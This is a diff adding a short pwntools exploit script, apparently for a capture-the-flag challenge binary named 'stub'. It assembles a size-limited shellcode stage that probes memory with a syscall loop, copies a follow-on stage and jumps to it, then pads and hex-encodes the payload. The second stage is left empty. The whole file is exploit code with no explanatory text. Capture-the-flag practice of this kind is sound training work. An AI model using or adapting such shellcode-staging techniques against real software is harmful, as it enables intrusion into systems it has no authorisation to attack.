@@ -1,0 +1,43 @@
+from pwn import *
+from binascii import hexlify
+
+
+e = ELF("./stub")
+
+context.binary = e.path
+
+pay = "\xf1" + asm("""
+  mov rdi, 0x100000000ff0	
+  mov rcx, 0x1000
+
+a:
+  add rdi, rcx
+  
+  mov al, 35
+  syscall
+
+  cmp rax, 0
+  jne a
+
+  sub rdi, 0xff0-194
+  
+  lea rsi, [rip+0x100]
+  add rdi, 0x10
+
+  rep movsq
+
+  jmp rdi
+""")
+
+stage2 = asm("""
+  
+
+""")
+
+# 56 limit
+print(str(len(pay)) + "/56")
+
+goal = hexlify(flat({0: pay, 0x38+8: 0}, filler=b'\x90'))
+
+
+print(goal)
